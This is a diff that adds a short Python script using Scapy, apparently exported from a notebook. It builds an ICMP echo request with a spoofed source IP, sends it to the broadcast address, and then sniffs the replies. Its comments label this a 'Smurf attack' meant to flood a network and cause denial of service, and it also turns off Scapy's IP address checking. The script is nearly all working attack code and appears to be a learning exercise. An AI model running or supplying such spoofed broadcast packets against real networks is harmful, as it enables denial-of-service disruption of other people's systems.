@@ -1,0 +1,28 @@
+
+# !pip install scapy 
+
+from scapy.all import *
+
+# Prevents any IP conflicts while sending the packet 
+# disable sIP address checking at computers 
+# this we do by sending request apcket to dhcp server 
+# with FAKE MAC addr 
+
+conf.checkIPaddr = False 
+
+# SMURF ATTACK -  As a hacker , send large number of ICMP Request Data PAckets (REquest) in BROADCAST to all compunters of network 
+# BUT with FAKE (SPOOFED) IP . Now , all these PC will send ICMP reply and ccongestion leads to DDOs Attack 
+
+ICMP_REQUEST = IP(src= '192.168.2.11' , dst = '255.255.255.255' ) / ICMP()
+
+
+send(ICMP_REQUEST , iface= None , loop =0 , verbose =1 )
+
+# sniff the packet 
+
+
+# In[ ]:
+
+
+a=sniff(filter="icmp and src 192.168.2.11")
+a 
